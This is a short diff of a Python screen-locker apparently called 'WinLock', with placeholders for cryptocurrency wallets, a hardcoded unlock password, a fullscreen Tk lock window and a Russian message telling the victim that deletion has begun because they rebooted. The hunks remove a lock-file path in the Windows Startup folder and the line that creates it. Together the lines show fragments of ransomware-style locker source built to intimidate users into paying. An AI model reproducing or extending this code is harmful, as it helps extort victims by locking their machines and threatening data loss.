@@ -9,7 +9,6 @@ LTC="LTC: wallet"
 ETH="ETH: wallet"
 SORRYBRO=""
 
-LOCKFILE = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\system.logger'
 
 #XMRimg = pyautogui.screenshot('my_screenshot.png')
 password=("haha_lol") #переменная с паролем от локера, можно установить что-то свое
@@ -32,7 +31,6 @@ def systemrun():
 if(os.path.exists(LOCKFILE)): #Если файл сесии найден
     SORRYBRO="Вы перезагрузили компьютер, удаление начато..."
     t1me = 300
-open(LOCKFILE, 'tw', encoding='utf-8').close()
 screen=Tk()
 screen.title("WinLock") 
 screen.attributes("-fullscreen",True) 
